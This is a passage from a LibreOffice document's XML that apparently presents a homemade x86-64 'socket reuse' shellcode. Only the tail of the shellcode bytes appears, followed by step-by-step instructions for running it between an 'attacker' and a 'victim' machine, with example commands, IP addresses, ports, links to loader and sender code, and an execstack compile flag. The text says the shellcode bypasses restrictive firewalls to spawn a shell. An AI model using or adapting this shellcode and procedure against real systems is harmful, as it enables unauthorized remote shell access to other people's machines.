      <text:p text:style-name="P85">"\xd8\x50\x48\x89\xe7\x48\x31\xf6\x48\x89\xf2\x6a\x3b\x58\x0f" </text:p>
      <text:p text:style-name="P85">"\x05"; </text:p>
      <text:p text:style-name="P85"><text:soft-page-break/></text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69">Next , how to test the shellcode .</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P41">I have <text:span text:style-name="T63">personally</text:span> tested this shellcode with kali linux and kweeze x64 linu<text:span text:style-name="T63">x</text:span> as “victim”</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P70">This shellcode <text:s/>is “socket reuse shellcode ” <text:s/>, this is used to bypass most restrictives firewall , spawn a shell in a opened connection .</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70">You can see more details here :</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P71"><text:a xlink:type="simple" xlink:href="http://www.blackhatlibrary.net/Shellcode/Socket-reuse">http://www.blackhatlibrary.net/Shellcode/Socket-reuse</text:a></text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71">You must <text:span text:style-name="T53">copy/paste</text:span> the socket-loader <text:a xlink:type="simple" xlink:href="http://www.blackhatlibrary.net/Shellcode/Appendix#socket-loader.c">here</text:a> compile* and execute to the “victim” machine : </text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71">Example for the command-line in the “victim” machine :</text:p>
      <text:p text:style-name="P71"><draw:rect text:anchor-type="paragraph" draw:z-index="25" draw:style-name="gr1" draw:text-style-name="P99" svg:width="3.0441in" svg:height="0.3476in" svg:x="-0.078in" svg:y="0.1146in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P87">:~$ /media/sf_Shared/Socket-loader 4445</text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P71">To the attacker machine you must <text:span text:style-name="T53">copy/paste</text:span> the sender <text:a xlink:type="simple" xlink:href="http://www.blackhatlibrary.net/Shellcode/Appendix#socket-reuse-send.c">here</text:a> <text:span text:style-name="T53"><text:s/></text:span>and execute in the attacker machine (paste <text:s/>shellcode in the appropriate section and compile* the code).</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71">Example of command :</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P71"><draw:rect text:anchor-type="paragraph" draw:z-index="26" draw:style-name="gr1" draw:text-style-name="P99" svg:width="4.637in" svg:height="0.326in" svg:x="-0.078in" svg:y="0.1228in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P87"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="27" draw:style-name="gr3" svg:width="0.1862in" svg:height="0.5004in" svg:x="1.8846in" svg:y="0.175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style-name="gr3" svg:width="0.1862in" svg:height="0.5004in" svg:x="2.6283in" svg:y="0.175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style-name="gr3" svg:width="0.1862in" svg:height="0.5004in" svg:x="3.3957in" svg:y="0.186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style-name="gr3" svg:width="0.1862in" svg:height="0.5004in" svg:x="4.1165in" svg:y="0.162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:~$./Shellcode-tester 192.168.11.143 444<text:span text:style-name="T51">5</text:span> 192.168.11.142 16961</text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P87"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P87"><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P87"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T52">victim ip / <text:s text:c="5"/>s-l port <text:s text:c="6"/>attacker ip <text:s text:c="4"/>shellcode port (0x4142) </text:span></text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P88">*To compile use </text:p>
      <text:p text:style-name="P87"><draw:rect text:anchor-type="paragraph" draw:z-index="31" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.9976in" svg:height="0.326in" svg:x="-0.078in" svg:y="0.152in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P97"><text:span text:style-name="T49">:~$./gcc </text:span>binary.c -z execstack -o binary</text:p>
      <text:p text:style-name="P97"/>
      <text:p text:style-name="P97"/>
      <text:p text:style-name="P98">All binary supplied in repositor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161in" fo:margin-right="0.7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08:36:44.709399459</meta:creation-date>
    <dc:date>2014-07-30T21:02:56.284401904</dc:date>
    <meta:editing-duration>P1DT4H3M31S</meta:editing-duration>
    <meta:editing-cycles>28</meta:editing-cycles>
    <meta:generator>LibreOffice/4.1.0.4$Linux_X86_64 LibreOffice_project/410m0$Build-4</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="8" meta:paragraph-count="268" meta:word-count="1505" meta:character-count="11448" meta:non-whitespace-character-count="8643"/>
  </office:meta>
</office:document-meta>
</file>